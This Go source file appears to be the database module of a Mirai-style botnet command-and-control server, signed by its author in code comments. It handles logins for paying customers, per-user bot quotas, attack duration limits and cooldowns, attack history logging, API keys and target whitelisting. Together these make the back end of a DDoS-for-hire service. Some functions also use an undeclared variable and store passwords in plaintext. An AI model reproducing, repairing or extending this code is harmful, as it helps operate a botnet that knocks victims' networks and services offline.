package main

import (
	"database/sql"
	"encoding/binary"
	"errors"
	"fmt"
	"net"
	"time"

	_ "github.com/go-sql-driver/mysql"
)

type Database struct {
	db *sql.DB
}
type AccountInfo struct {
	username string
	maxBots  int
	admin    int
}

func NewDatabase(dbAddr string, dbUser string, dbPassword string, dbName string) *Database {
	db, err := sql.Open("mysql", fmt.Sprintf("%s:%s@tcp(%s)/%s", dbUser, dbPassword, dbAddr, dbName))
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println("\033[01;36mCNC \033[01;32mExecuted \033[01;33mSuccefully \033[01;34mPort: \033[01;31m 45")
	db.Exec("INSERT INTO logins (username, action) VALUES (?, ?)", "NetStart", "Net startup")
	db.Exec("UPDATE users SET connected = 0")
	return &Database{db}
}

func (this *Database) TryLogin(username string, password string, ip net.Addr) (bool, AccountInfo) {
	rows, err := this.db.Query("SELECT username, max_bots, admin FROM users WHERE username = ? AND password = ? AND (wrc = 0 OR (UNIX_TIMESTAMP() - last_paid < `intvl` * 24 * 60 * 60))", username, password)
	t := time.Now()
	strRemoteAddr := ip.String()
	host, port, err := net.SplitHostPort(strRemoteAddr)
	if err != nil {
		fmt.Println(err)
		fmt.Printf("\033[01;31mFailed Login In :: \x1b[1;36m%s \033[01;31m:: \x1b[1;36m%s \033[01;31m:: \x1b[1;36m%s \033[01;31m:: \x1b[1;36m%s\n", username, host, port, t.Format("20060102150405"))
		this.db.Exec("INSERT INTO logins (username, action, ip) VALUES (?, ?, ?)", username, "Fail", host)
		return false, AccountInfo{"", 0, 0}
	}
	defer rows.Close()
	if !rows.Next() {
		fmt.Printf("\033[01;31mFailed Login In :: \x1b[1;36m%s \033[01;31m:: \x1b[1;36m%s \033[01;31m:: \x1b[1;36m%s \033[01;31m:: \x1b[1;36m%s\n", username, host, port, t.Format("20060102150405"))
		this.db.Exec("INSERT INTO logins (username, action, ip) VALUES (?, ?, ?)", username, "Fail", host)
		return false, AccountInfo{"", 0, 0}
	}
	var accInfo AccountInfo
	rows.Scan(&accInfo.username, &accInfo.maxBots, &accInfo.admin)
	fmt.Printf("\033[01;32mLogged In :: \x1b[1;36m%s \033[01;31m:: \x1b[1;36m%s \033[01;31m:: \x1b[1;36m%s \033[01;31m:: \x1b[1;36m%s\n", accInfo.username, host, port, t.Format("20060102150405"))
	this.db.Exec("INSERT INTO logins (username, action, ip) VALUES (?, ?, ?)", accInfo.username, "Login", host)
	return true, accInfo
}
func (this *Database) CreateBasic(username string, password string, max_bots int, duration int, cooldown int) bool {
	rows, err := this.db.Query("SELECT username FROM users WHERE username = ?", username)
	if err != nil {
		fmt.Println(err)
		return false
	}
	if rows.Next() {
		return false
	}
	this.db.Exec("INSERT INTO users (username, password, max_bots, admin, last_paid, cooldown, duration_limit) VALUES (?, ?, ?, 0, UNIX_TIMESTAMP(), ?, ?)", username, password, max_bots, cooldown, duration)
	return true
}
func (this *Database) CreateAdmin(username string, password string, max_bots int, duration int, cooldown int) bool {
	rows, err := this.db.Query("SELECT username FROM users WHERE username = ?", username)
	if err != nil {
		fmt.Println(err)
		return false
	}
	if rows.Next() {
		return false
	}
	this.db.Exec("INSERT INTO users (username, password, max_bots, admin, last_paid, cooldown, duration_limit) VALUES (?, ?, ?, 1, UNIX_TIMESTAMP(), ?, ?)", username, password, max_bots, cooldown, duration)
	return true
}
func (this *Database) GetMessage() string { // by @Thar3seller
	sqlStatement := `SELECT message FROM messages WHERE user_id = 0;`
	var message string

	row := this.db.QueryRow(sqlStatement)
	err := row.Scan(&message)
	switch err {
	case sql.ErrNoRows:
		return message
	case nil:
		return message
	default:
		panic(err)
	}
}
func (this *Database) Broadcast(username string, message string) (bool, error) {
	rows, err := this.db.Query("SELECT id FROM users WHERE username = ?", username)
	defer rows.Close()
	if err != nil {
		fmt.Println(err)
	}
	var userId uint32
	rows.Scan(&userId)
	rows.Close()
	this.db.Exec("INSERT INTO messages (user_id, message) VALUES (?, ?)", userId, message)
	return true, nil
}
func (this *Database) RemoveMessage() bool {
	rows, err := this.db.Query("DELETE FROM `messages` WHERE user_id = 0")
	if err != nil {
		fmt.Println(err)
		return false
	}
	if rows.Next() {
		return false
	}
	this.db.Exec("DELETE FROM `messages` WHERE username = 0")
	return true
}
func (this *Database) isConnected (username string) bool {
	sqlStatement := `SELECT connected FROM users WHERE username = ?;`

	var connected int
	row := this.db.QueryRow(sqlStatement, username)
	err := row.Scan(&connected)

	switch err {
		case sql.ErrNoRows:
			return true
		case nil:

			if (connected == 1) {
				return true
			} else {
				return false
			}
			
		default:
			panic(err)
	}

}
func (this *Database) readconnected() [50]string {
	
	

	rows, err := this.db.Query("SELECT username FROM users WHERE connected = 1 LIMIT 50;")
		if err != nil {
		// handle this error better than this
		panic(err)
	}
	defer rows.Close()


	var users_connected [50]string;

	//LOOP -> While

	//varibale iteradora

	var iterator int = 0;
	for rows.Next() {

		// lo de adentro no puede leer lo de afuera, lo de adentro puede leer lo de afuera
		var connected string
		err = rows.Scan(&connected)
		if err != nil {
		// handle this error
			panic(err)
		}

		users_connected[iterator] = connected
		
		iterator += 1
		
	}


	// get any error encountered during iteration
	err = rows.Err()
	if err != nil {
		panic(err)
	}

	return users_connected

}
func (this *Database) Kickall() {
	this.db.Exec("UPDATE users SET connected = 0")
}
func (this *Database) Kick(Kickeduser string) bool {
	sqlStatement := `
	UPDATE users
	SET connected = 0
	WHERE username = ?;`

	_, err = this.db.Exec(sqlStatement, Kickeduser)
	if err != nil {
		return false
	}
	return true
}
func (this *Database) setUserState(username string, state int) bool {

	sqlStatement := `
	UPDATE users
	SET connected = ?
	WHERE username = ?;`

	_, err = this.db.Exec(sqlStatement, state, username)
	if err != nil {
		return false
	}
	return true

}


func (this *Database) FetchDay(username string) int {
	sqlStatement := `SELECT max_day FROM users WHERE username = ?;`
	var max_day int

	row := this.db.QueryRow(sqlStatement, username)
	err := row.Scan(&max_day)
	switch err {
	case sql.ErrNoRows:
		return 0
	case nil:
		return max_day
	default:
		panic(err)
	}
}
func (this *Database) FetchMonth(username string) int {
	sqlStatement := `SELECT max_month FROM users WHERE username = ?;`
	var max_month int

	row := this.db.QueryRow(sqlStatement, username)
	err := row.Scan(&max_month)
	switch err {
	case sql.ErrNoRows:
		return 0
	case nil:
		return max_month
	default:
		panic(err)
	}
}
func (this *Database) FetchYear(username string) int {
	sqlStatement := `SELECT max_year FROM users WHERE username = ?;`
	var max_year int

	row := this.db.QueryRow(sqlStatement, username)
	err := row.Scan(&max_year)
	switch err {
	case sql.ErrNoRows:
		return 0
	case nil:
		return max_year
	default:
		panic(err)
	}
}
func (this *Database) GetAdminLevel(username string) int {
	sqlStatement := `SELECT admin FROM users WHERE username = ?;`
	var admin int

	row := this.db.QueryRow(sqlStatement, username)
	err := row.Scan(&admin)
	switch err {
	case sql.ErrNoRows:
		return 0
	case nil:
		return admin
	default:
		panic(err)
	}
}
func (this *Database) MaxDateDay(username string, max_date int) bool {
	sqlStatement := `
	UPDATE users
	SET max_day = ?
	WHERE username = ?;`

	_, err := this.db.Exec(sqlStatement, max_date, username)
	if err != nil {
		return false
	}
	return true
}
func (this *Database) MaxDateMonth(username string, max_date int) bool {
	sqlStatement := `
	UPDATE users
	SET max_month = ?
	WHERE username = ?;`

	_, err := this.db.Exec(sqlStatement, max_date, username)
	if err != nil {
		return false
	}
	return true
}
func (this *Database) MaxDateYear(username string, max_date int) bool {
	sqlStatement := `
	UPDATE users
	SET max_year = ?
	WHERE username = ?;`
//Thar3seller was here
	_, err := this.db.Exec(sqlStatement, max_date, username)
	if err != nil {
		return false
	}
	return true
}
func (this *Database) RemoveUser(username string) bool {
	rows, err := this.db.Query("DELETE FROM `users` WHERE username = ?", username)
	if err != nil {
		fmt.Println(err)
		return false
	}
	if rows.Next() {
		return false
	}
	this.db.Exec("DELETE FROM `users` WHERE username = ?", username)
	return true
}
func (this *Database) AddWhitelist(prefix string, netmask string) bool {
	rows, err := this.db.Query("SELECT prefix FROM `whitelist` WHERE prefix = ?", prefix)
	if err != nil {
		fmt.Println(err)
		return false
	}
	if rows.Next() {
		return false
	}
	this.db.Exec("INSERT INTO whitelist (prefix, netmask) VALUES (?, ?)", prefix, netmask)
	return true
}
func (this *Database) RemoveWhitelist(prefix string) bool {
	rows, err := this.db.Query("DELETE FROM `whitelist` WHERE prefix = ?", prefix)
	if err != nil {
		fmt.Println(err)
		return false
	}
	if rows.Next() {
		return false
	}
	this.db.Exec("DELETE FROM `whitelist` WHERE prefix = ?", prefix)
	return true
}
func (this *Database) ContainsWhitelistedTargets(attack *Attack) bool {
	rows, err := this.db.Query("SELECT prefix, netmask FROM whitelist")
	if err != nil {
		fmt.Println(err)
		return false
	}
	defer rows.Close()
	for rows.Next() {
		var prefix string
		var netmask uint8
		rows.Scan(&prefix, &netmask)
		ip := net.ParseIP(prefix)
		ip = ip[12:]
		iWhitelistPrefix := binary.BigEndian.Uint32(ip)
		for aPNetworkOrder, aN := range attack.Targets {
			rvBuf := make([]byte, 4)
			binary.BigEndian.PutUint32(rvBuf, aPNetworkOrder)
			iAttackPrefix := binary.BigEndian.Uint32(rvBuf)
			if aN > netmask {
				if netshift(iWhitelistPrefix, netmask) == netshift(iAttackPrefix, netmask) {
					return true
				}
			} else if aN < netmask {
				if (iAttackPrefix >> aN) == (iWhitelistPrefix >> aN) {
					return true
				}
			} else {
				if iWhitelistPrefix == iAttackPrefix {
					return true
				}
			}
		}
	}
	return false
}
func (this *Database) CanLaunchAttack(username string, duration uint32, fullCommand string, maxBots int, allowConcurrent int) (bool, error) {
	rows, err := this.db.Query("SELECT id, duration_limit, admin, cooldown FROM users WHERE username = ?", username)
	defer rows.Close()
	if err != nil {
		fmt.Println(err)
	}
	var userId, durationLimit, admin, cooldown uint32
	if !rows.Next() {
		return false, errors.New("Your access has been terminated")
	}
	rows.Scan(&userId, &durationLimit, &admin, &cooldown)
	if durationLimit != 0 && duration > durationLimit {
		return false, errors.New(fmt.Sprintf("You may not send attacks longer than %d seconds.", durationLimit))
	}
	rows.Close()
	if admin == 0 {
		rows, err = this.db.Query("SELECT time_sent, duration FROM history WHERE user_id = ? AND (time_sent + duration + ?) > UNIX_TIMESTAMP()", userId, cooldown)
		if err != nil {
			fmt.Println(err)
		}
		if rows.Next() {
			var timeSent, historyDuration uint32
			rows.Scan(&timeSent, &historyDuration)
			return false, errors.New(fmt.Sprintf("Please wait %d seconds before sending another attack", (timeSent+historyDuration+cooldown)-uint32(time.Now().Unix())))
		}
	}
	this.db.Exec("INSERT INTO history (user_id, time_sent, duration, command, max_bots) VALUES (?, UNIX_TIMESTAMP(), ?, ?, ?)", userId, duration, fullCommand, maxBots)
	return true, nil
}
func (this *Database) CheckApiCode(apikey string) (bool, AccountInfo) {
	rows, err := this.db.Query("SELECT username, max_bots, admin FROM users WHERE api_key = ?", apikey)
	if err != nil {
		fmt.Println(err)
		return false, AccountInfo{"", 0, 0}
	}
	defer rows.Close()
	if !rows.Next() {
		return false, AccountInfo{"", 0, 0}
	}
	var accInfo AccountInfo
	rows.Scan(&accInfo.username, &accInfo.maxBots, &accInfo.admin)
	return true, accInfo
}
